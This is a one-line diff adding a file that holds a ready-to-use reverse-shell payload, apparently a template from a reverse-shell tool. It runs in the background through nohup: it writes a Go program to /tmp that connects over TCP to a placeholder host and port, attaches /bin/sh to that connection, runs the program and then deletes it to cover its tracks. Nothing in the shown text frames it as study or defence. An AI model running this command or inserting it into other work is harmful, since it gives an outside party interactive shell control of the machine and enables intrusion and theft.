@@ -1,0 +1,1 @@
+/usr/bin/nohup /bin/bash -c "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"__HOST__:__PORT__\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/platypus.go && go run /tmp/platypus.go && rm /tmp/platypus.go" >/dev/null &
